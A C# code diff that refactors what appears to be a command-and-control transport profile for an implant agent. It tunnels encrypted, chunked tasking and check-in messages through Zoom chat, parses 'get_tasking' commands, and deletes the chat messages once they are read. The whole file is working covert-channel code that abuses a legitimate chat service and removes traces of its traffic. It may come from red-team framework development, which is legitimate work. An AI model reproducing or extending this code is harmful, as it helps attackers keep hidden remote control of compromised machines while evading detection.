@@ -128,12 +128,16 @@ namespace Agent.Profiles
             return _token;
         }
 
+        private HttpRequestMessage CreateBearerRequest(HttpMethod method, string relativePath, string token)
+        {
+            var req = new HttpRequestMessage(method, $"{apiBase.TrimEnd('/')}{relativePath}");
+            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
+            return req;
+        }
+
         private async Task<string?> SendChatMessage(string text)
         {
-            string token = await GetToken();
-            string url = $"{apiBase.TrimEnd('/')}/chat/users/{userId}/messages";
-            using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, url);
-            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
+            using HttpRequestMessage req = CreateBearerRequest(HttpMethod.Post, $"/chat/users/{userId}/messages", await GetToken());
             req.Content = new StringContent(
                 JsonSerializer.Serialize(new { message = text, to_channel = channelId }),
                 System.Text.Encoding.UTF8,
@@ -162,14 +166,13 @@ namespace Agent.Profiles
             string? nextPageToken = null;
             for (int page = 0; page < MAX_MESSAGE_PAGES; page++)
             {
-                string url = $"{apiBase.TrimEnd('/')}/chat/users/{userId}/messages?to_channel={channelId}&page_size=50";
-                if (!string.IsNullOrEmpty(nextPageToken))
-                {
-                    url += $"&next_page_token={Uri.EscapeDataString(nextPageToken)}";
-                }
-
-                using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Get, url);
-                req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
+                string query = string.IsNullOrEmpty(nextPageToken)
+                    ? ""
+                    : $"&next_page_token={Uri.EscapeDataString(nextPageToken)}";
+                using HttpRequestMessage req = CreateBearerRequest(
+                    HttpMethod.Get,
+                    $"/chat/users/{userId}/messages?to_channel={channelId}&page_size=50{query}",
+                    token);
                 using HttpResponseMessage resp = await _client.SendAsync(req);
                 if (!resp.IsSuccessStatusCode)
                 {
@@ -177,33 +180,7 @@ namespace Agent.Profiles
                 }
 
                 string body = await resp.Content.ReadAsStringAsync();
-                try
-                {
-                    using JsonDocument doc = JsonDocument.Parse(body);
-                    if (doc.RootElement.TryGetProperty("messages", out var msgs))
-                    {
-                        foreach (var m in msgs.EnumerateArray())
-                        {
-                            string? id = m.TryGetProperty("id", out var idEl) ? idEl.GetString() : null;
-                            if (string.IsNullOrWhiteSpace(id))
-                                continue;
-                            result.Add(new ZoomChatMessage
-                            {
-                                id = id,
-                                message = m.TryGetProperty("message", out var msgEl) ? msgEl.GetString() ?? "" : "",
-                            });
-                        }
-                    }
-                    nextPageToken = doc.RootElement.TryGetProperty("next_page_token", out var next)
-                        ? next.GetString()
-                        : null;
-                }
-                catch
-                {
-                    break;
-                }
-
-                if (string.IsNullOrEmpty(nextPageToken))
+                if (!TryParseMessagesPage(body, result, out nextPageToken) || string.IsNullOrEmpty(nextPageToken))
                 {
                     break;
                 }
@@ -211,14 +188,47 @@ namespace Agent.Profiles
             return result;
         }
 
+        private static bool TryParseMessagesPage(string body, List<ZoomChatMessage> result, out string? nextPageToken)
+        {
+            nextPageToken = null;
+            try
+            {
+                using JsonDocument doc = JsonDocument.Parse(body);
+                if (doc.RootElement.TryGetProperty("messages", out var msgs))
+                {
+                    foreach (var m in msgs.EnumerateArray())
+                    {
+                        string? id = m.TryGetProperty("id", out var idEl) ? idEl.GetString() : null;
+                        if (string.IsNullOrWhiteSpace(id))
+                        {
+                            continue;
+                        }
+                        result.Add(new ZoomChatMessage
+                        {
+                            id = id,
+                            message = m.TryGetProperty("message", out var msgEl) ? msgEl.GetString() ?? "" : "",
+                        });
+                    }
+                }
+                nextPageToken = doc.RootElement.TryGetProperty("next_page_token", out var next)
+                    ? next.GetString()
+                    : null;
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         private async Task<bool> DeleteChatMessage(string id)
         {
             try
             {
-                string token = await GetToken();
-                string url = $"{apiBase.TrimEnd('/')}/chat/users/{userId}/messages/{id}?to_channel={channelId}";
-                using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Delete, url);
-                req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
+                using HttpRequestMessage req = CreateBearerRequest(
+                    HttpMethod.Delete,
+                    $"/chat/users/{userId}/messages/{id}?to_channel={channelId}",
+                    await GetToken());
                 using HttpResponseMessage resp = await _client.SendAsync(req);
                 return resp.IsSuccessStatusCode || resp.StatusCode == HttpStatusCode.NotFound;
             }
@@ -258,18 +268,17 @@ namespace Agent.Profiles
             }
         }
 
+        private bool CanReserveOwnedDeletions(string job, string[] ownedIds) =>
+            ownedIds.All(id => _deletionOwners.TryGetValue(id, out string? owner) && owner == job) &&
+            _pendingDeletions.Count + ownedIds.Count(id => !_pendingDeletions.Contains(id)) <= maxPendingDeletions;
+
         private bool TryReserveProcessedJob(string job, IEnumerable<string> ids, DateTimeOffset now)
         {
             lock (_pendingDeletionsLock)
             {
                 string[] ownedIds = ids.Distinct().ToArray();
-                if (ownedIds.Any(id => !_deletionOwners.TryGetValue(id, out string? owner) || owner != job) ||
-                    (!_processedJobs.ContainsKey(job) && _processedJobs.Count >= maxPendingDeletions))
-                {
-                    return false;
-                }
-                string[] newIds = ownedIds.Where(id => !_pendingDeletions.Contains(id)).ToArray();
-                if (_pendingDeletions.Count + newIds.Length > maxPendingDeletions)
+                if ((!_processedJobs.ContainsKey(job) && _processedJobs.Count >= maxPendingDeletions) ||
+                    !CanReserveOwnedDeletions(job, ownedIds))
                 {
                     return false;
                 }
@@ -289,14 +298,15 @@ namespace Agent.Profiles
             lock (_pendingDeletionsLock)
             {
                 string[] ownedIds = ids.Distinct().ToArray();
-                if (ownedIds.Any(id => !_deletionOwners.TryGetValue(id, out string? owner) || owner != job))
+                if (!CanReserveOwnedDeletions(job, ownedIds))
+                {
                     return false;
-                string[] newIds = ownedIds.Where(id => !_pendingDeletions.Contains(id)).ToArray();
-                if (_pendingDeletions.Count + newIds.Length > maxPendingDeletions)
-                    return false;
+                }
 
                 foreach (string id in ownedIds)
+                {
                     _pendingDeletions.Add(id);
+                }
                 return true;
             }
         }
@@ -460,106 +470,23 @@ namespace Agent.Profiles
 
         private async Task ProcessInbound(DateTimeOffset now)
         {
-            lock (_pendingDeletionsLock)
-            {
-                foreach (string job in _processedJobs.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
-                {
-                    bool hasPendingDeletion = _deletionOwners.Any(entry =>
-                        entry.Value == job && _pendingDeletions.Contains(entry.Key));
-                    if (hasPendingDeletion)
-                        continue;
-                    _processedJobs.Remove(job);
-                    foreach (string id in _deletionOwners.Where(entry => entry.Value == job).Select(entry => entry.Key).ToArray())
-                        _deletionOwners.Remove(id);
-                }
-            }
+            PruneExpiredProcessedJobs(now);
             await RetryPendingDeletions();
-            foreach ((string job, JobBucket bucket) in _pendingJobs.ToArray())
-            {
-                if (now - bucket.created <= PENDING_JOB_TTL)
-                    continue;
-                if (!TryReserveStaleCleanup(job, bucket.ids))
-                    continue;
-
-                _pendingJobs.Remove(job);
-                foreach (string id in bucket.ids)
-                    await DeleteOrTrackOwned(id, job);
-            }
+            await CleanupStalePendingJobs(now);
             if (DeletionCapacityExhausted())
             {
                 return;
             }
+
             List<ZoomChatMessage> messages = await ListChatMessages();
-            // Accumulate SERVER_TO_AGENT envelopes across pages and poll cycles.
             foreach (var msg in messages)
             {
-                if (!TryParseEnvelope(msg.message, out ZoomEnvelope env))
-                {
-                    if (env.t == DIR_SERVER_TO_AGENT && env.c == _correlationId && !IsMessageClaimed(msg.id))
-                        await DeleteOrTrack(msg.id);
-                    continue;
-                }
-                if (env.t != DIR_SERVER_TO_AGENT || env.c != _correlationId || env.j == null)
-                    continue;
-                bool isNewJob = !_pendingJobs.TryGetValue(env.j, out JobBucket? bucket);
-                if (isNewJob && _pendingJobs.Count >= MAX_PENDING_JOBS)
-                {
-                    if (!IsMessageClaimed(msg.id))
-                        await DeleteOrTrack(msg.id);
-                    continue;
-                }
-                if (!isNewJob && bucket!.chunks.TryGetValue(env.s, out string? existingChunk))
-                {
-                    if (existingChunk != env.d)
-                        bucket.invalid = true;
-                    if (!IsMessageClaimed(msg.id))
-                        await DeleteOrTrack(msg.id);
-                    continue;
-                }
-                if (!TryClaimMessage(msg.id, env.j))
-                    continue;
-                if (isNewJob)
-                {
-                    bucket = new JobBucket { total = env.n, created = now };
-                    _pendingJobs[env.j] = bucket;
-                }
-                else if (bucket!.total != env.n)
-                {
-                    bucket.invalid = true;
-                }
-
-                if (!bucket!.ids.Add(msg.id))
-                {
-                    continue;
-                }
-                if (!bucket.chunks.ContainsKey(env.s) &&
-                    (PendingChunkCount() >= MAX_PENDING_CHUNKS ||
-                     env.d!.Length > MAX_PENDING_BYTES - PendingChunkBytes()))
-                {
-                    bucket.ids.Remove(msg.id);
-                    if (bucket.chunks.Count == 0)
-                        _pendingJobs.Remove(env.j);
-                    await DeleteOrTrack(msg.id);
-                    continue;
-                }
-                if (!bucket.chunks.TryAdd(env.s, env.d!) && bucket.chunks[env.s] != env.d)
-                {
-                    bucket.invalid = true;
-                }
+                await AccumulateInboundMessage(msg, now);
             }
 
-            foreach (var kv in _pendingJobs.ToArray())
+            foreach ((string job, JobBucket bucket) in _pendingJobs.ToArray())
             {
-                string job = kv.Key;
-                JobBucket bucket = kv.Value;
-                if (_processedJobs.ContainsKey(job))
-                {
-                    foreach (string id in bucket.ids)
-                        await DeleteOrTrack(id);
-                    _pendingJobs.Remove(job);
-                    continue;
-                }
-                if (bucket.invalid)
+                if (_processedJobs.ContainsKey(job) || bucket.invalid)
                 {
                     foreach (string id in bucket.ids)
                     {
@@ -569,79 +496,45 @@ namespace Agent.Profiles
                     continue;
                 }
                 if (bucket.chunks.Count != bucket.total)
-                    continue;
-
-                string encrypted = string.Concat(Enumerable.Range(0, bucket.total).Select(i => bucket.chunks[i]));
-                string plain;
-                try
                 {
-                    plain = crypt.Decrypt(encrypted);
-                }
-                catch (FormatException)
-                {
-                    if (!await TryDiscardCompletedJob(job, bucket, now))
-                        break;
                     continue;
                 }
-                if (string.IsNullOrEmpty(plain))
+                if (!await TryCompleteJob(job, bucket, now))
                 {
-                    if (!await TryDiscardCompletedJob(job, bucket, now))
-                        break;
+                    break;
+                }
+            }
+        }
+
+        private void PruneExpiredProcessedJobs(DateTimeOffset now)
+        {
+            lock (_pendingDeletionsLock)
+            {
+                foreach (string job in _processedJobs.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
+                {
+                    if (_deletionOwners.Any(entry => entry.Value == job && _pendingDeletions.Contains(entry.Key)))
+                    {
+                        continue;
+                    }
+                    _processedJobs.Remove(job);
+                    foreach (string id in _deletionOwners.Where(entry => entry.Value == job).Select(entry => entry.Key).ToArray())
+                    {
+                        _deletionOwners.Remove(id);
+                    }
+                }
+            }
+        }
+
+        private async Task CleanupStalePendingJobs(DateTimeOffset now)
+        {
+            foreach ((string job, JobBucket bucket) in _pendingJobs.ToArray())
+            {
+                if (now - bucket.created <= PENDING_JOB_TTL || !TryReserveStaleCleanup(job, bucket.ids))
+                {
                     continue;
                 }
 
-                if (!_checkedIn)
-                {
-                    CheckinResponse? response;
-                    try
-                    {
-                        response = JsonSerializer.Deserialize(plain, CheckinResponseJsonContext.Default.CheckinResponse);
-                    }
-                    catch (JsonException)
-                    {
-                        if (!await TryDiscardCompletedJob(job, bucket, now))
-                            break;
-                        continue;
-                    }
-                    if (!CheckinResponseValidation.IsSuccessful(response))
-                    {
-                        if (!await TryDiscardCompletedJob(job, bucket, now))
-                            break;
-                        continue;
-                    }
-                    if (!TryReserveProcessedJob(job, bucket.ids, now))
-                        break;
-                    _pendingJobs.Remove(job);
-                    _checkinResponse = response!;
-                    _checkinAvailable.Set();
-                    _checkedIn = true;
-                }
-                else
-                {
-                    GetTaskingResponse? gtr;
-                    try
-                    {
-                        gtr = JsonSerializer.Deserialize(plain, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    }
-                    catch (JsonException)
-                    {
-                        if (!await TryDiscardCompletedJob(job, bucket, now))
-                            break;
-                        continue;
-                    }
-                    if (gtr?.action != "get_tasking")
-                    {
-                        if (!await TryDiscardCompletedJob(job, bucket, now))
-                            break;
-                        continue;
-                    }
-                    if (!TryReserveProcessedJob(job, bucket.ids, now))
-                        break;
-                    _pendingJobs.Remove(job);
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                    this.SetTaskingReceived?.Invoke(this, tra);
-                }
-
+                _pendingJobs.Remove(job);
                 foreach (string id in bucket.ids)
                 {
                     await DeleteOrTrackOwned(id, job);
@@ -649,15 +542,156 @@ namespace Agent.Profiles
             }
         }
 
-        private async Task<bool> TryDiscardCompletedJob(string job, JobBucket bucket, DateTimeOffset now)
+        private async Task AccumulateInboundMessage(ZoomChatMessage msg, DateTimeOffset now)
         {
+            if (!TryParseEnvelope(msg.message, out ZoomEnvelope env))
+            {
+                if (env.t == DIR_SERVER_TO_AGENT && env.c == _correlationId && !IsMessageClaimed(msg.id))
+                {
+                    await DeleteOrTrack(msg.id);
+                }
+                return;
+            }
+            if (env.t != DIR_SERVER_TO_AGENT || env.c != _correlationId || env.j == null)
+            {
+                return;
+            }
+            bool isNewJob = !_pendingJobs.TryGetValue(env.j, out JobBucket? bucket);
+            if (isNewJob && _pendingJobs.Count >= MAX_PENDING_JOBS)
+            {
+                if (!IsMessageClaimed(msg.id))
+                {
+                    await DeleteOrTrack(msg.id);
+                }
+                return;
+            }
+            if (!isNewJob && bucket!.chunks.TryGetValue(env.s, out string? existingChunk))
+            {
+                if (existingChunk != env.d)
+                {
+                    bucket.invalid = true;
+                }
+                if (!IsMessageClaimed(msg.id))
+                {
+                    await DeleteOrTrack(msg.id);
+                }
+                return;
+            }
+            if (!TryClaimMessage(msg.id, env.j))
+            {
+                return;
+            }
+            if (isNewJob)
+            {
+                bucket = new JobBucket { total = env.n, created = now };
+                _pendingJobs[env.j] = bucket;
+            }
+            else if (bucket!.total != env.n)
+            {
+                bucket.invalid = true;
+            }
+
+            if (!bucket!.ids.Add(msg.id))
+            {
+                return;
+            }
+            if (!bucket.chunks.ContainsKey(env.s) &&
+                (PendingChunkCount() >= MAX_PENDING_CHUNKS ||
+                 env.d!.Length > MAX_PENDING_BYTES - PendingChunkBytes()))
+            {
+                bucket.ids.Remove(msg.id);
+                if (bucket.chunks.Count == 0)
+                {
+                    _pendingJobs.Remove(env.j);
+                }
+                await DeleteOrTrack(msg.id);
+                return;
+            }
+            if (!bucket.chunks.TryAdd(env.s, env.d!) && bucket.chunks[env.s] != env.d)
+            {
+                bucket.invalid = true;
+            }
+        }
+
+        private async Task<bool> TryCompleteJob(string job, JobBucket bucket, DateTimeOffset now)
+        {
+            string encrypted = string.Concat(Enumerable.Range(0, bucket.total).Select(i => bucket.chunks[i]));
+            CheckinResponse? checkinResponse = null;
+            GetTaskingResponse? taskingResponse = null;
+            if (TryDecryptJobPayload(encrypted, out string plain))
+            {
+                if (!_checkedIn)
+                {
+                    checkinResponse = TryParseCheckinPayload(plain);
+                }
+                else
+                {
+                    taskingResponse = TryParseTaskingPayload(plain);
+                }
+            }
+
             if (!TryReserveProcessedJob(job, bucket.ids, now))
+            {
                 return false;
+            }
 
             _pendingJobs.Remove(job);
+            if (checkinResponse is not null)
+            {
+                _checkinResponse = checkinResponse;
+                _checkinAvailable.Set();
+                _checkedIn = true;
+            }
+            else if (taskingResponse is not null)
+            {
+                this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(taskingResponse));
+            }
+
             foreach (string id in bucket.ids)
+            {
                 await DeleteOrTrackOwned(id, job);
+            }
             return true;
+        }
+
+        private bool TryDecryptJobPayload(string encrypted, out string plain)
+        {
+            try
+            {
+                plain = crypt.Decrypt(encrypted);
+                return !string.IsNullOrEmpty(plain);
+            }
+            catch (FormatException)
+            {
+                plain = string.Empty;
+                return false;
+            }
+        }
+
+        private static CheckinResponse? TryParseCheckinPayload(string plain)
+        {
+            try
+            {
+                CheckinResponse? response = JsonSerializer.Deserialize(plain, CheckinResponseJsonContext.Default.CheckinResponse);
+                return CheckinResponseValidation.IsSuccessful(response) ? response : null;
+            }
+            catch (JsonException)
+            {
+                return null;
+            }
+        }
+
+        private static GetTaskingResponse? TryParseTaskingPayload(string plain)
+        {
+            try
+            {
+                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plain, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                return gtr?.action == "get_tasking" ? gtr : null;
+            }
+            catch (JsonException)
+            {
+                return null;
+            }
         }
 
         // ===================== IProfile =====================
